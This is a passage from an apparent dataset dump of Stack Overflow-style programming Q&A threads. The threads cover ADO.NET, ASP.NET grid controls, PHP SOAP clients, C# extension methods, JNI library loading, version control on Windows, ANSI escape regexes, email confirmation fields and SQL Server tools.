fully functional and free. The only downsides are the occasional bug and built in expiration (typically around the time a new beta is available), but for this poor bloke it does wonders until I can get my boss to chip in for a license.\\n\"], ['I need to learn ADO.NET to build applications based on MS Office. I have read a good deal about ADO.NET in the MSDN Library, but everything seems rather messy to me.\\n\\nWhat are the basics one must figure out when using ADO.NET? I think a few key words will suffice to let me organize my learning.\\n', 'There are three key components (assuming ur using SQL server):\\n\\n\\nSQLConnection\\nSqlCommand\\nSqlDataReader\\n\\n\\n(if you\\'re using something else, replace Sql with \"Something\", like MySqlConnection, OracleCommand)\\n\\nEverything else is just built on top of that.\\n\\nExample 1:\\n\\nusing (SqlConnection connection = new SqlConnection(\"CONNECTION STRING\"))\\nusing (SqlCommand command = new SqlCommand())\\n{\\n  command.commandText = \"SELECT Name FROM Users WHERE Status = @OnlineStatus\";\\n  command.Connection = connection;\\n  command.Parameters.Add(\"@OnlineStatus\", SqlDbType.Int).Value = 1; //replace with enum\\n  connection.Open();\\n\\n  using (SqlDataReader dr = command.ExecuteReader))\\n  {\\n      List&lt;string&gt; onlineUsers = new List&lt;string&gt;();\\n\\n      while (dr.Read())\\n      {\\n         onlineUsers.Add(dr.GetString(0));\\n      }\\n  }\\n}\\n\\n\\nExample 2:\\n\\nusing (SqlConnection connection = new SqlConnection(\"CONNECTION STRING\"))\\nusing (SqlCommand command = new SqlCommand())\\n{\\n  command.commandText = \"DELETE FROM Users where Email = @Email\";\\n  command.Connection = connection;\\n  command.Parameters.Add(\"@Email\", SqlDbType.VarChar, 100).Value = \"user@host.com\";\\n  connection.Open();\\n  command.ExecuteNonQuery();\\n}\\n\\n', \"Another way of getting a command object is to call connection.CreateCommand(). \\n\\nThat way you shouldn't have to set the Connection property on the command object. \\n\"], [\"I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:\\r\\n\\r\\nWhat is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?\\r\\n\\r\\nThe intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.\\r\\n\\r\\nEdit: Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.\", 'The DataGrid was originally in .NET 1.0.  The GridView was introduced (and replaced the DataGrid) in .NET 2.0.  They provide nearly identical functionality.', 'DataGrid was an ASP.NET 1.1 control, still supported. GridView arrived in 2.0, made certain tasks simpler added different databinding features:\\n\\nThis link has a comparison of DataGrid and GridView features -\\n\\nhttps://msdn.microsoft.com/en-us/library/05yye6k9(v=vs.100).aspx\\n', 'The key difference is in the ViewState management IIRC. The DataGrid requires ViewState turned on in order to have edit and sort capabilities.\\n', \"If you're working in Visual Studio 2008 / .NET 3.5, you probably shouldn't use either. Use the ListView - it gives you the features of the GridView combined with the styling flexibility of a repeater.\\n\", 'some basic diffrence between gridview and  details view\\n\\nthe GridView control also has a number of new features and advantages over the DataGrid control, which include: \\n\\n Richer design-time capabilities. \\n Improved data source binding capabilities. \\n Automatic handling of sorting, paging, updates, and deletes. \\n Additional column types and design-time column operations. \\n A Customized pager user interface (UI) with the PagerTemplate property. \\n\\nDifferences between the GridView control and the DataGrid control include: \\n Different custom-paging support. \\n Different event models.\\n', 'One key difference security wise is that DataGrid uses BoundColumn which does not HtmlEncode the bound data.  There is no property to turn HtmlEncoding on or off either, so you need to do it in code somehow.\\n\\nGridView uses BoundField, which does HtmlEncode by default on the bound data and it has a HtmlEncode property if you need to turn it off.\\n', 'The GridView control is the successor to the DataGrid control. Like the DataGrid control, the GridView control was designed to display data in an HTML table. When bound to a data source, the DataGrid and GridView controls each display a row from a DataSource as a row in an output table.\\n\\nBoth the DataGrid and GridView controls are derived from the WebControl class. Although it has a similar object model to that of the DataGrid control, the GridView control also has a number of new features and advantages over the DataGrid control, which include:\\n\\n\\nRicher design-time capabilities.\\nImproved data source binding capabilities.\\nAutomatic handling of sorting, paging, updates, and deletes.\\nAdditional column types and design-time column operations.\\nA Customized pager user interface (UI) with the PagerTemplate property.\\n\\n\\nDifferences between the GridView control and the DataGrid control include:\\n\\n\\nDifferent custom-paging support.\\nDifferent event models.\\n\\n\\nSorting, paging, and in-place editing of data requires additional coding when using the DataGrid control. The GridView control enables you to add sorting, paging, and editing capabilities without writing any code. Instead, you can automate these tasks, along with other common tasks such as data binding to a data source, by setting properties on the control.\\n'], ['Is it \"acceptable\" to have an ASP.Net 2.0 application without the BLL (Business Logic Layer) as the following?\\n\\n\\nSQL Server Data Storage &amp; Stored Procedures\\nData Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs\\nPresentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL\\n\\n\\nIs a BLL always preferable, even if business logic is entirely validatable in the presentation\\'s code behind?  What are the potential drawbacks for not using a BLL?\\n', 'Like everything else it is environmental and depends on the use of the system.  The question you need to ask your self is:\\r\\n\\r\\n\\r\\nWill this be actively developed\\r\\nIs this going to be used over the course of many years and expanded on\\r\\nIs the expansion of the application unknown and thus infinite\\r\\n\\r\\n\\r\\nReally it comes down to laziness.  How much time to do you want to spend reworking the system from the UI?  Because having no business layer means duplication of rules in your UI across possibility many many pages.\\r\\n\\r\\nThen again if this is a proof of concept or short demo or class project.  Take the easy way out.', \"It's acceptable as long as you understand the consequences. The main reason you'd have a BLL is to re-use that logic elsewhere throughout your application.\\r\\n\\r\\nIf you have all that validation logic in the presentation code, you're really making it difficult to re-use elsewhere within your application.\", \"Acceptable? Depends who you ask and what your requirements are. Is this app an internal one-off used by you and a few other people? Maybe this is good enough. If it's meant to be a production ready enterprise application that will grow and be maintained over the years, then you probably want to invest more effort up-front to build a maintainable app.\\r\\nSeparation of Concerns is a key design technique for building maintainable apps. By mixing presentation, business, and data access logic all together, you can end up with a very fragile difficult to change application architecture.\", \"It depends. If your business logic is in your click events and page loads, it is NOT acceptable.\\n\\nIt appears that your business logic is somewhere within the DAL (e.g., stored procedures and such), just as long as you are consistent, it's fine. As long as you are very, very sure that your clients will always be using SQL Server then this approach is not a problem.\\n\\nI know a colleague who has all his business logic in stored procedures that his views are mostly thin clients to database backends: he has been immensely successful with the product that he sells. But that's only because he's very consistent with it.\\n\", 'If the application is a general one, then the business logic layer can be used in complete other applications too. Like, I normally use my CMS related BLL classes in other applications.\\n'], ['Is there available any tool for PHP which can be used to generate code for consuming a web service based on its WSDL? Something comparable to clicking \"Add Web Reference\" in Visual Studio or the Eclipse plugin which does the same thing for Java.\\n', \"Well, those features are specific to a tool that you are using for development in those languages.\\r\\n\\r\\nYou wouldn't have those tools if (for example) you were using notepad to write code. So, maybe you should ask the question for the tool you are using.\\r\\n\\r\\nFor PHP: http://webservices.xml.com/pub/a/ws/2004/03/24/phpws.html\", 'I have used NuSOAP in the past.  I liked it because it is just a set of PHP files that you can include.  There is nothing to install on the web server and no config options to change.  It has WSDL support as well which is a bonus.\\n', \"I've had great success with wsdl2php.  It will automatically create wrapper classes for all objects and methods used in your web service.\\n\", 'In PHP 5 you can use SoapClient on the WSDL to call the web service functions. For example:\\n\\n$client = new SoapClient(\"some.wsdl\");\\n\\n\\nand $client is now an object which has class methods as defined in some.wsdl. So if there was a method called getTime in the WSDL then you would just call:\\n\\n$result = $client-&gt;getTime();\\n\\n\\nAnd the result of that would (obviously) be in the $result variable. You can use the __getFunctions method to return a list of all the available methods.\\n', 'This article explains how you can use PHP SoapClient to call a api web service.\\n', 'HI I got this from this site : http://forums.asp.net/t/887892.aspx?Consume+an+ASP+NET+Web+Service+with+PHP\\n\\nThe web service has method Add which takes two params:\\n\\n&lt;?php\\n    $client = new SoapClient(\"http://localhost/csharp/web_service.asmx?wsdl\");\\n\\n     print_r( $client-&gt;Add(array(\"a\" =&gt; \"5\", \"b\" =&gt;\"2\")));\\n?&gt;\\n\\n', 'Say you were provided the following:\\n\\n&lt;x:Envelope xmlns:x=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:int=\"http://thesite.com/\"&gt;\\n    &lt;x:Header/&gt;\\n    &lt;x:Body&gt;\\n        &lt;int:authenticateLogin&gt;\\n            &lt;int:LoginId&gt;12345&lt;/int:LoginId&gt;\\n        &lt;/int:authenticateLogin&gt;\\n    &lt;/x:Body&gt;\\n&lt;/x:Envelope&gt;\\n\\n\\nand\\n\\n&lt;s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\\n    &lt;s:Body xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\\n        &lt;authenticateLoginResponse xmlns=\"http://thesite.com/\"&gt;\\n            &lt;authenticateLoginResult&gt;\\n                &lt;RequestStatus&gt;true&lt;/RequestStatus&gt;\\n                &lt;UserName&gt;003p0000006XKX3AAO&lt;/UserName&gt;\\n                &lt;BearerToken&gt;Abcdef1234567890&lt;/BearerToken&gt;\\n            &lt;/authenticateLoginResult&gt;\\n        &lt;/authenticateLoginResponse&gt;\\n    &lt;/s:Body&gt;\\n&lt;/s:Envelope&gt;\\n\\n\\nLet\\'s say that accessing http://thesite.com/ said that the WSDL address is:\\nhttp://thesite.com/PortalIntegratorService.svc?wsdl\\n\\n$client = new SoapClient(\\'http://thesite.com/PortalIntegratorService.svc?wsdl\\');\\n$result = $client-&gt;authenticateLogin(array(\\'LoginId\\' =&gt; 12345));\\nif (!empty($result-&gt;authenticateLoginResult-&gt;RequestStatus)\\n    &amp;&amp; !empty($result-&gt;authenticateLoginResult-&gt;UserName)) {\\n    echo \\'The username is: \\'.$result-&gt;authenticateLoginResult-&gt;UserName;\\n}\\n\\n\\nAs you can see, the items specified in the XML are used in the PHP code though the LoginId value can be changed.\\n'], ['How is it possible to make prototype methods in C#.Net?\\n\\nIn JavaScript, I can do the following to create a trim method for the string object:\\n\\nString.prototype.trim = function() {\\n    return this.replace(/^\\\\s+|\\\\s+$/g,\"\");\\n}\\n\\n\\nHow can I go about doing this in C#.Net?\\n', 'You need to create an extension method, which requires .NET 3.5. The method needs to be static, in a static class. The first parameter of the method needs to be prefixed with \"this\" in the signature.\\r\\n\\r\\npublic static string MyMethod(this string input){    // do things}\\r\\n\\r\\nYou can then call it like\\r\\n\\r\\n\"asdfas\".MyMethod();', 'You can\\'t dynamically add methods to existing objects or classes in .NET, except by changing the source for that class.\\r\\n\\r\\nYou can, however, in C# 3.0, use extension methods, which look like new methods, but are compile-time magic.\\r\\n\\r\\nTo do this for your code:\\r\\n\\r\\npublic static class StringExtensions{    public static String trim(this String s)    {        return s.Trim();    }}\\r\\n\\r\\nTo use it:\\r\\n\\r\\nString s = \"  Test  \";s = s.trim();\\r\\n\\r\\nThis looks like a new method, but will compile the exact same way as this code:\\r\\n\\r\\nString s = \"  Test  \";s = StringExtensions.trim(s);\\r\\n\\r\\nWhat exactly are you trying to accomplish? Perhaps there are better ways of doing what you want?', 'Using the 3.5 compiler you can use an Extension Method:\\r\\n\\r\\npublic static void Trim(this string s){  // implementation}\\r\\n\\r\\nYou can use this on a CLR 2.0 targeted project (3.5 compiler) by including this hack:\\r\\n\\r\\nnamespace System.Runtime.CompilerServices{  [AttributeUsage(AttributeTargets.Method | AttributeTargets.Class | AttributeTargets.Assembly)]  public sealed class ExtensionAttribute : Attribute  {  }}', 'It sounds like you\\'re talking about C#\\'s Extension Methods. You add functionality to existing classes by inserting the \"this\" keyword before the first parameter. The method has to be a static method in a static class. Strings in .NET already have a \"Trim\" method, so I\\'ll use another example.public static class MyStringEtensions\\r\\n{\\r\\n    public static bool ContainsMabster(this string s)\\r\\n    {\\r\\n        return s.Contains(\"Mabster\");\\r\\n    }\\r\\n}\\r\\n\\r\\nSo now every string has a tremendously useful ContainsMabster method, which I can use like this:if (\"Why hello there, Mabster!\".ContainsMabster()) { /* ... */ }\\r\\n\\r\\nNote that you can also add extension methods to interfaces (eg IList), which means that any class implementing that interface will also pick up that new method.\\r\\nAny extra parameters you declare in the extension method (after the first \"this\" parameter) are treated as normal parameters.'], [\"Example: I have two shared objects (same should apply to .dlls). The first shared object is from a third-party library, we'll call it libA.so. I have wrapped some of this with JNI and created my own library, libB.so. Now libB depends on libA.\\r\\n\\r\\nWhen webstarting, both libraries are places in some webstart working area. My java code attempts to load libB. At this point the system loader will attempt to load libA which is not in the system library path (java.library.path won't help this). The end result is that libB has an unsatisfied link and cannot be used. \\r\\n\\r\\nI have tried loading libA before libB, but that still does not work. Seems the OS wants to do that loading for me. Is there any way I can make this work other than statically  compiling?\", \"I'm not sure if this would be handled exactly the same way for webstart, but we ran into this situation in a desktop application when dealing with a set of native libraries (dlls in our case).\\r\\n\\r\\nLoading libA before libB should work, unless one of those libraries has a dependency that is unaccounted for and not in the path. My understanding is that once it gets to a system loadLibrary call (i.e. Java has found the library in its java.library.path and is now telling the OS to load it) - it is completely dependent on the operating system to find any dependent libraries, because at that point it is the operating system that is loading the library for the process, and the OS only knows how to look in the system path. That seems hard to set in the case of a Webstart app, but there is a way around this that does not involve static compiling. You may be able to shuffle where your libraries are - I am unsure \\r\\n\\r\\nIf you use a custom classloader, you can override loadLibrary and findLibrary so that it can locate your libraries from within a jar in your classpath, and if you also make it aware of your native library dependencies (i.e. libB depends on libA depends on libX, then when loading libB you can catch yourself and ensure you load libA first, and in checking that notice and load libX first. Then the OS doesn't try to find a library that isn't in your path. It's klunky and a bit painful, but ensuring Java finds them and loads them all in the correct order can work.\", 'Are both native libraries packaged into a signed jar which is listed as\\n\\n&lt;nativelib ...&gt;\\n\\n\\nIn the JNLP file?\\n', 'Static compilation proved to be the only way to webstart multiple dependent native libraries.\\n'], ['So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I\\'ve heard that git\\'s Windows support is decent these days, but don\\'t have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\\r\\nCan I get any recommendations?', 'EDIT: Perhaps add a \"dvcs\", \"distrubutedversioncontrol\", \"distrubuted\"\\r\\n\\r\\nI\\'ve used Mercurial on Windows with no problems. You can use TortoiseHG or just use the command line. Mercurial does require Python, but that is easy to install in Windows as well.\\r\\n\\r\\nMercurial Binary Packages', 'I use msys-git on windows every single day. Works fast and flawlessly.\\r\\n\\r\\nAlthough the newer build has some problems with git-svn, this build (Git-1.5.5-preview20080413.exe) has a working git-svn.', \"There's a nice comparison between git, hg and bzr in this InfoQ article.  They all have their strengths and weaknesses.  You'll have to think about your project and your workflows and choose the best fit.  The good news is that they're all fairly good.\", \"I agree with basszero. I'm using mercurial under windows and it's as easy and reliable as it can get. My development team is spread over Europe (well Dublin and Vienna :-).\\nWe use VPN to commit or sometime the built in webserver (hgserve). Both work fine with no problems out of the box.\\n\\nAlso diff3 open source tool works perfect with mercurial and TortoiseHG out of the box.\\n\", \"I've had the best luck with Bazaar, followed by Mercurial. Never could get Git to work correctly. A quick search shows that Git still requires clunky emulation layers like Cygwin/MSYS, and I can't find any integration tools like TortoiseBzr for Git.\\n\\nWith Mercurial in Windows, I had several minor issues (insensitive paths, symlinks, ). They were usually fixed eventually, but I felt that the same quality of testing was not applied to running on Windows as for the other platforms. Bazaar also had better documentation for integrating with native applications like Visual C.\\n\", 'In my experience using GIT on windows is a major pain.  But I have been using Fossil SCM for some time now, and I think it actually fits your needs exactly.\\n\\nIt also has a built in Ticket system and a Wiki.  And the whole program is contained in 1 file and it works right out of the box.\\n\\nI totally recommend it.\\n\\nHere is a link to the site http://www.fossil-scm.org/\\n\\nRemember, this site is self hosting, what that means is you are looking at the web interface to fossil it self, when you look at tickets and the wiki and documentation, you actually are using fossil.\\n\\nBut if your project has millions of lines of code and is a few gigabytes in size, you have to use GIT, there is no way around that problem.\\n\\nEnjoy.\\n', \"If you are concerned about an easy to use interface:\\n\\nThe bazaar folk now include TortoiseBzr in their windows binary package.  That's got to be a pretty strong indicator that they think it is up to snuff.  I don't know what the maturity/stability of TortoiseHg is, but there certainly isn't a decent GUI interface for git yet, and the MSYS git build still needs some work IMO.\\n\\nIf your team are comfortable with or prefer the command line, then either bazaar or mercurial would probably work well for you, and are both probably about the same in terms of learning curve.  Git's learning curve is much higher.  It is like the swiss-army knife that is almost wider than it is long, with all the little gadgets and do-dads in it and hanging off it, with the springs so tight that you occasionally slice a finger open trying to prise a blade out.\\n\", \"At last I checked, the only thing you need for Mercurial is Python and to grab a binary package. If you find yourself with more time and want to fiddle / build it yourself, look here.\\n\\nThe only real drawback with HG is its idea of branching .. but for some people that's a major plus.\\n\\nI like it because its intuitive, easy to install and works on anything that Python does. I don't think that all of the available plugins will work for you, but most should.\\n\"], ['I am new to C# and am doing some work in an existing application. I have a DirectX viewport that has components in it that I want to be able to position using arrow keys.\\n\\nCurrently I am overriding ProcessCmdKey and catching arrow input and send an OnKeyPress event. This works, but I want to be able to use modifiers(ALT+CTRL+SHIFT). As soon as I am holding a modifier and press an arrow no events are triggered that I am listening to.\\n\\nDoes anyone have any ideas or suggestions on where I should go with this?\\n', 'Within your overridden ProcessCmdKey how are you determining which key has been pressed?\\r\\nThe value of keyData (the second parameter) will change dependant on the key pressed and any modifier keys, so, for example, pressing the left arrow will return code 37, shift-left will return 65573, ctrl-left 131109 and alt-left 262181.\\r\\nYou can extract the modifiers and the key pressed by ANDing with appropriate enum values:protected override bool ProcessCmdKey(ref Message msg, Keys keyData)\\r\\n{\\r\\n    bool shiftPressed = (keyData &amp; Keys.Shift) != 0;\\r\\n    Keys unmodifiedKey = (keyData &amp; Keys.KeyCode);\\r\\n\\r\\n    // rest of code goes here\\r\\n}\\r\\n', \"I upvoted Tokabi's answer, but for comparing keys there is some additional advice on StackOverflow.com here. Here are some functions which I used to help simplify everything.\\n\\n   public Keys UnmodifiedKey(Keys key)\\n    {\\n        return key &amp; Keys.KeyCode;\\n    }\\n\\n    public bool KeyPressed(Keys key, Keys test)\\n    {\\n        return UnmodifiedKey(key) == test;\\n    }\\n\\n    public bool ModifierKeyPressed(Keys key, Keys test)\\n    {\\n        return (key &amp; test) == test;\\n    }\\n\\n    public bool ControlPressed(Keys key)\\n    {\\n        return ModifierKeyPressed(key, Keys.Control);\\n    }\\n\\n    public bool AltPressed(Keys key)\\n    {\\n        return ModifierKeyPressed(key, Keys.Alt);\\n    }\\n\\n    public bool ShiftPressed(Keys key)\\n    {\\n        return ModifierKeyPressed(key, Keys.Shift);\\n    }\\n\\n    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)\\n    {\\n        if (KeyPressed(keyData, Keys.Left) &amp;&amp; AltPressed(keyData))\\n        {\\n            int n = code.Text.IndexOfPrev('&lt;', code.SelectionStart);\\n            if (n &lt; 0) return false;\\n            if (ShiftPressed(keyData))\\n            {\\n                code.ExpandSelectionLeftTo(n);\\n            }\\n            else\\n            {\\n                code.SelectionStart = n;\\n                code.SelectionLength = 0;\\n            }\\n            return true;\\n        }\\n        else if (KeyPressed(keyData, Keys.Right) &amp;&amp; AltPressed(keyData))\\n        {\\n            if (ShiftPressed(keyData))\\n            {\\n                int n = code.Text.IndexOf('&gt;', code.SelectionEnd() + 1);\\n                if (n &lt; 0) return false;\\n                code.ExpandSelectionRightTo(n + 1);\\n            }\\n            else\\n            {\\n                int n = code.Text.IndexOf('&lt;', code.SelectionStart + 1);\\n                if (n &lt; 0) return false;\\n                code.SelectionStart = n;\\n                code.SelectionLength = 0;\\n            }\\n            return true;\\n        }\\n        return base.ProcessCmdKey(ref msg, keyData);\\n    }\\n\\n\"], [\"We have a question with regards to XML-sig and need detail about the optional elements as well as some of the canonicalization and transform stuff.  We're writing a spec for a very small XML-syntax payload that will go into the metadata of media files and it needs to by cryptographically signed.  Rather than re-invent the wheel, We thought we should use the XML-sig spec but I think most of it is overkill for what we need, and so we like to have more information/dialogue with people who know the details.\\n\\nSpecifically, do we need to care about either transforms or canonicalization if the XML is very basic with no tabs for formatting and is specific to our needs?\\n\", 'Can you let us know that technology you are using as there are some intresting bits out there around this stuff and some short cuts... i.e. WSE2 is complex beast and something that I dont like getting wrong!  \\n\\nI dont like developers doing this and there are WSE2 accelorators out there like SSL Accelorates as the processing of encryption has a hugh cost best to take it out of process from the normal code and the development arena.\\n\\nIf this is an option for you - Try look at this - ForumSystems\\n', 'If the option exists to not do an XML signature and instead just to treat the XML as a byte stream and to sign that, do it. It will be easier to implement, easier to understand, more stable (no canonicalization, transform, policy, ...) and faster. \\n\\nIf you absolutely must have XML DSIG (sadly, some of us must), it is certainly possible these days but there are many, many caveats. You need good library support, with Java this is out of the box in JDK 1.6, I am not familiar with other platforms. You must test interoperability with the receiving end of your signed XML, especially if they are potentially on a different platform.\\n\\nBe sure to read Why XML Security Is Broken, it basically covers all the ground regarding the horror that is XML Canonicalization and gives some pointers to some alternatives.\\n', 'If you need to sign XML in code, check XMLBlackbox which provides canonicalization and all other transformations for you. XMLBlackbox also supports XAdES.\\n'], ['I\\'m writing a Telnet client of sorts in C# and part of what I have to parse are ANSI/VT100 escape sequences, specifically, just those used for colour and formatting (detailed here).\\n\\nOne method I have is one to find all the codes and remove them, so I can render the text without any formatting if needed:\\n\\n    \\npublic static string StripStringFormating(string formattedString)\\n{\\n    if (rTest.IsMatch(formattedString))\\n        return rTest.Replace(formattedString, string.Empty);\\n    else\\n        return formattedString;\\n}\\n\\n\\nI\\'m new to regular expressions and I was suggested to use this:\\n\\nstatic Regex rText = new Regex(@\"\\\\e\\\\[[\\\\d;]+m\", RegexOptions.Compiled);\\n\\nHowever, this failed if the escape code was incomplete due to an error on the server. So then this was suggested, but my friend warned it might be slower (this one also matches another condition (z) that I might come across later):\\n\\nstatic Regex rTest = \\n              new Regex(@\"(\\\\e(\\\\[([\\\\d;]*[mz]?))?)?\", RegexOptions.Compiled);\\n\\nThis not only worked, but was in fact faster to and reduced the impact on my text rendering. Can someone explain to a regexp newbie, why? :)\\n', 'Without doing detailed analysis, I\\'d guess that it\\'s faster because of the question marks. These allow the regular expression to be \"lazy,\" and stop as soon as they have enough to match, rather than checking if the rest of the input matches.\\n\\nI\\'m not entirely happy with this answer though, because this mostly applies to question marks after * or +. If I were more familiar with the input, it might make more sense to me.\\n\\n(Also, for the code formatting, you can select all of your code and press Ctrl+K to have it add the four spaces required.)\\n', 'The reason why #1 is slower is that [\\\\d;]+ is a greedy quantifier. Using +? or *? is going to do lazy quantifing. See MSDN - Quantifiers for more info.\\r\\n\\r\\nYou may want to try:\\r\\n\\r\\n\"(\\\\e\\\\[(\\\\d{1,2};)*?[mz]?)?\"\\r\\n\\r\\nThat may be faster for you.', 'Do you really want to do run the regexp twice? Without having checked (bad me) I would have thought that this would work well:\\n\\npublic static string StripStringFormating(string formattedString)\\n{    \\n    return rTest.Replace(formattedString, string.Empty);\\n}\\n\\n\\nIf it does, you should see it run ~twice as fast...\\n', \"I'm not sure if this will help with what you are working on, but long ago I wrote a regular expression to parse ANSI graphic files.\\n\\n(?s)(?:\\\\e\\\\[(?:(\\\\d+);?)*([A-Za-z])(.*?))(?=\\\\e\\\\[|\\\\z)\\n\\n\\nIt will return each code and the text associated with it.\\n\\nInput string:\\n\\n&lt;ESC&gt;[1;32mThis is bright green.&lt;ESC&gt;[0m This is the default color.\\n\\n\\nResults:\\n\\n[ [1, 32], m, This is bright green.]\\n[0, m, This is the default color.]\\n\\n\"], [\"My organization has a form to allow users to update their email address with us.\\r\\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\\r\\n\\r\\nI always copy/paste my email address when faced with the confirmation.\\r\\nI'm assuming most of our users are not so savvy.\\r\\n\\r\\nRegardless, is this considered a good practice?\\r\\nI can't stand it personally, but I also realize it probably isn't meant for me.\\r\\nIf someone screws up their email, they can't login, and they must call to sort things out.\", \"I agree with you in that it is quite an annoyance to me (I also copy and paste my address into the second input).\\r\\n\\r\\nThat being said, for less savvy users, it is probably a good idea. Watching my mother type is affirmation that many users do not look at the screen when they type (when she's using her laptop she resembles Linus from Peanuts when he's playing the piano).  If it's important for you to have the user's correct email address then I would say having a confirmation input is a very good idea (one of these days I'll probably type my email address wrong in the first box and paste it wrong into the second box and then feel like a complete idiot).\", 'I would just use one input box. The \"Confirm\" input is a remnant form the \"Confirm Password\" method. \\r\\n\\r\\nWith passwords, this is useful because they are usually typed as little circles. So, you can\\'t just look at it to make sure that you typed it correctly. \\r\\n\\r\\nWith a regular text box, you can visually check your input. So, there is no need for a confirmation input box.', 'I agree with Justin, while most technical folks will use the copy, paste method, for the less savvy users it is a good practice.\\r\\n\\r\\nOne more thing that I would add is that the second field should have the auto-complete feature disabled.  This ensures that there is human input from either method on at least one of the fields.', \"I'd say that this is ok but should only be reserved for forms where the email is essential. If you mistype your email for your flight booking then you have severed the two-way link between yourself and the other party and risk not getting the confirmation number, here on StackOverflow it would only mean your Gravatar would not be loaded ...\\r\\n\\r\\nI'd consider myself fairly techie but I always fill in both fields /wo cut-paste if I regard it to be important enough.\", 'As long as a field is viewable, you do not need a confirm box. As long as you do some form validation to be sure that  it is at least in valid format for an email address let the user manage the rest of the issues.', \"I've seen plenty of people type their email address wrong and I've also looked through user databases full of invalid email address.\\r\\n\\r\\nThe way I see it you've got two options.  Use a second box to confirm the input, or send an authentication/activation email.\\r\\n\\r\\nBoth are annoyances so you get to choose which you think will annoy your users less.\\r\\n\\r\\nMost would argue that having to find an email and click on a link is more annoying, but it avoids the copy/paste a bad address issue, and it allows you to do things like delete or roll back users if they don't activate after say 48 hours.\", \"While the more tech-savvy people tend to copy and paste, not technical people find it just as annoying to have to type something twice. During a lot of user testing I've down, the less tech-savvy - the more annoyed they seem with something like this... They struggle to type as it is, when they see they have to type their email in again it's usually greeted with a strong sign.\\n\\nI would suggested a few things.\\n\\n\\nNext to the input box write the style of the information you are looking for so something like (i.e. user@domain.com). The reason this is important is you would be surprised how many of the less tech-savvy don't really understand the different between a website and an email address, so let them know visually the format you want.\\nRun strong formatting test in real time, and visually show a user that the format is good or bad. A green check box if everything is okay comes to mind.\\nLastly, depending on your system architecture I often use a library to actually wrong a domain in the background. I don't necessarily try to run a VRFY on the server - I often use a library to check to make sure the domain they entered has MX records in it's DNS record.\\n\\n\", \"Typing things twice is frustrating and doesn't prevent copy&amp;paste errors or even some typos.\\n\\nI would use an authenticate/activate schema with a roll back to the old address if the activation is not met within 48 hours or if the email bounces.\\n\", 'I tend to have it send a verification code to the email address specified (and only ask for it once), and not change the email address until the user has entered the code I sent them.\\n\\nThis has the advantage that if they try to set it to a dozen different addresses in quick succession, you\\'ll know which ones work by which verification code they put in.\\n\\nPlus, if I am presented with a \"confirm email address\" box, I just copy and paste from the previous one, and if I\\'m guilty of that, I\\'m sure that other less careful users will do the same.\\n'], ['I\\'m developing a Sharepoint application and use .NET AjaxControlToolkit library, we are adding a custom aspx page to the Sharepoint. Sharepoint 2007 run in quirks mode so I\\'ve made some modification to the AJAX library to make it behave like it normally should. The problem is, the other team already use AJAX library and it is a different version with mine. This cause conflict because there could be only one dll in the bin folder with the same name.\\r\\n\\r\\nFrom what I know, .NET should be able to handle this situation easily. I\\'ve tried using strong name and GAC to solve it, but it still refer to the dll in the bin folder. If there is no AjaxControlToolkit.dll in the bin folder, the application will simply fail to load the assembly. \\r\\n\\r\\nIf I use complete assembly information on my like this \\r\\n\\r\\n&lt;%@     Register     tagprefix=\"AjaxControlToolkit\"    namespace=\"AjaxControlToolkit\"    assembly=\"AjaxControlToolkit, Version=1.0.299.18064,     PublicKeyToken=12345678abcdefgh,     Culture=neutral\"%&gt;\\r\\n\\r\\nIt gives me Compiler Error CS0433\\r\\n\\r\\nCan someone help me on how to use multiple version of assembly in an application?', \"Well the link for Compiler Error CS0433 makes it pretty clear that the core issue is not with multiple versions of the assembly being referenced - but with namespace + typename conflicts.\\n\\nWhen you load up / reference a type - the compiler can't resolve which DLL to load that type from. If Sharepoint is going to load both your DLLs versions (as you say it needs to) - this error will always come.\\n\\nSimplest fix would be to change the namespaces in the new DLL, since it does have your custom tweaks, and you control the code - mark it clearly as well.\\n\"], [\"I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?\\n\\nNot there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.\\n\", \"TOAD for MS SQL looks pretty good.  I've never used it personally but I have used Quest's other products and they're solid.\\n\", 'There is an express version on SSMS that has considerably fewer features but still has the basics.\\n', \"I've started using LinqPad. In addition to being more lightweight than SSMS, you can also practice writing LINQ queries- way more fun than boring old TSQL!\", \"If you are already spending time in Visual Studio, then you can always use the Server Explorer to connect to any .Net compliant database server.\\r\\nProvided you're using Professional or greater, you can create and edit tables and databases, run queries, etc.\", 'You can still install and use Query Analyzer from previous SQL Server versions.\\n', 'Oracle has a free program called SQL Developer which will work with Microsoft SQL Server as well as Oracle &amp; MySQL.  When accessing SQL Server, however, Oracle SQL Developer is only intended to enable an easy migration to Oracle, so your SQL Server database is essentially read-only.\\n', 'powershell + sqlcmd :)\\n', 'Seems that no one mentioned Query Express (http://www.albahari.com/queryexpress.aspx) and a fork Query ExPlus (also link at the bottom of http://www.albahari.com/queryexpress.aspx)\\n\\nBTW. First URL is the home page of Joseph Albahari who is the author of LINQPad (check out this killer tool)\\n', 'Database .NET\\n', 'vim + dbext :)\\n', 'I have been using Atlantis SQL Enywhere, a free software, for almost 6 months and has been working really well. Works with SQL 2005 and SQL 2008 versions. I am really impressed with its features and keyboard shortcuts are similar to VS, so makes the transition really smooth to a new editor.\\n\\nSome of the features that are worth mentioning:\\n\\n\\nIntellisense that actually works when using multiple tables and joins with aliases  \\nSuggestion of joins when using multiple tables (reduces time on typing, really neat)  \\nRich formatting of sql code, AutoIndent using Ctrl K, Ctrl D.  \\nBetter representation of 